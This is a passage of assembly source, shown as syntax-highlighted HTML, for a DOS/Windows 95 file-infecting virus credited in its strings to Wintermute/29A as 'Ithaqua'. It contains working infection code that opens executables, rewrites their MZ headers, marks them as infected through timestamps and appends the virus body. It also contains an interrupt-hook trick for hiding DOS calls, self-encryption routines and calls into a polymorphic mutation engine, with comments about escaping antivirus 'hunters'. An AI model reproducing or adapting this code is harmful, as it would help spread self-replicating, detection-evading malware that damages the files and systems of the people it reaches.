        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0e8h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">posicion_sub</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Operate call</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ;       Windows 95 adapted shit</span><span class="sc0">
</span><span class="sc1">;                           W95 adapted shit</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">EXE_W95_Infect</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">front_door</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'XE'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">end_infection</span><span class="sc1">;@nah_fuck</span><span class="sc0">



        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                        </span><span class="sc1">; Attributes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">restore_attrs</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                </span><span class="sc1">; Time/date of file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@itwasinfected</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                  </span><span class="sc1">; Reads header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">01ch</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">buffercom</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">buffercom</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'M'</span><span class="sc4">+</span><span class="sc12">'Z'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@itwasinfected</span><span class="sc0">

        </span><span class="sc6">cbw</span><span class="sc0">                                     </span><span class="sc1">; overlays</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">buffercom</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@itwasinfected</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">buffercom</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc2">40h</span><span class="sc0">    </span><span class="sc1">; Windoze</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@itwasinfected</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Ptrtoend</span><span class="sc0">                        </span><span class="sc1">; EOF</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">buffercom</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Smack_My_Bitch_UP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">stack_old</span><span class="sc4">],</span><span class="sc8">sp</span><span class="sc0">  </span><span class="sc1">; not enuff stack sometimes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">stack_old</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ss</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_endstack2</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">return_point</span><span class="sc4">],</span><span class="sc5">tha_difference</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">copy_myself</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">return_point</span><span class="sc4">],</span><span class="sc5">tha_difference</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">stack_old</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">stack_old</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CS_IP</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">    </span><span class="sc1">; We actualize header</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">buffercom</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CS_IP</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">buffercom</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],((</span><span class="sc5">virus_size</span><span class="sc4">+</span><span class="sc2">300h</span><span class="sc4">-</span><span class="sc2">15h</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc4">)*</span><span class="sc2">2</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Ptrtoend</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">buffercom</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">        </span><span class="sc1">; File size, etc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">buffercom</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Ptrtowhatever</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; Write header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">01ch</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">buffercom</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">

</span><span class="sc5">@itwasinfected</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc1">;date</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">

</span><span class="sc5">restore_attrs</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc1">;attr</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@closego</span><span class="sc0">

</span><span class="sc5">Ptrtoend</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">

</span><span class="sc5">Ptrtowhatever</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">cwd</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">




</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;                           Data for the virus</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">ret_pos</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">buffercom</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">CS_IP</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp2</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01ch</span><span class="sc4">-</span><span class="sc2">16h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">comjmp</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">are_we_on_MBR</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">This_Virus_Has_Internal_Text_XP</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Love. Hate. I''ll be awaiting you on the dark side, '</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'watching the nonsense.'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">VName</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'[Ithaqua] virus by Wintermute/29A'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">encryption_ends</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;                          Encryption/decryption</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Let's hide. Artificial beeing makes hunters ignore.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">Swap_seg</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Swap_off</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">copy_myself</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">push_all_regs</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">0000h</span><span class="sc4">],</span><span class="sc2">071eh</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc4">+</span><span class="sc2">201h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                   </span><span class="sc1">; Start crypt</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decrypt</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                                            </span><span class="sc1">; Now we crypt poly engine</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">; Are we able to make poly ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">No_Poly_This_Time</span><span class="sc0">       </span><span class="sc1">; Don't poly when inserting</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">push_all_regs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RNME</span><span class="sc0">        </span><span class="sc1">; Reconstructed Necromantic Mutation Engine</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pop_all_regs</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">

</span><span class="sc5">No_Poly_This_Time</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">52h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0eeh</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decrypt</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pop_all_regs</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">int0h</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">int0handler</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_bp</span><span class="sc4">],</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">call_21h</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">j21</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">
</span><span class="sc5">int21h</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">int21h_plural</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; Four int21h addresses</span><span class="sc0">
</span><span class="sc5">outta_crypt</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">decrypt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">outta_crypt</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">encryption_starts</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">encryption_length</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
